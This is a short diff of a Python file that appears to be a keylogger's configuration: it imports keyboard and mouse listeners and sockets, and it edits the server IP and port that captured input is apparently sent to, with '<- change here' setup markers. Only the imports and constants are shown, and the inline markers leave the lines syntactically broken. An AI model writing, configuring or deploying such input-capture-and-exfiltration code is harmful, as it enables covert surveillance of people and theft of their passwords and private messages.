@@ -1,8 +1,8 @@
 from pynput import keyboard, mouse
 import socket, datetime, time, threading
 
-SERVER_IP = "192.168.1.115"
-SERVER_PORT = 5555
+SERVER_IP = "192.168.1.1" <- change here
+SERVER_PORT = 5555        <- change here
 BUFFER_SIZE = 20
 FLUSH_INTERVAL = 5
 
